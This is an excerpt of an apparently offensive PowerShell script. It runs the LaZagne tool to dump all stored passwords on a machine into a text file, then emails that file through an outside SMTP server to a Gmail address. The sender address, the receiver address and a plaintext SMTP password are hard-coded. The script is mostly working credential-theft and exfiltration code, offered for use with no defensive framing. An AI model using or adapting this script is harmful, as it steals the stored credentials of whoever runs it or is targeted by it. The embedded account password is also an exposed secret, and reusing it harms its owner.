...
& "$dir\lazagne.exe" all -vv > "$dir\output.txt"
...
#Mail Exfiltration
$smtp = "smtp.tiscali.it" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
$From = "arvelase@tiscali.it" # Put the SENDER HERE
$To = "andrea6191@gmail.com" # Put the RECEIVER HERE
$smtp = "smtp.tiscali.it" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
...
$Password = "Tiscali92619619" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
# The smtp server used to send the file
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 465 -UseSsl -Credential $Credential
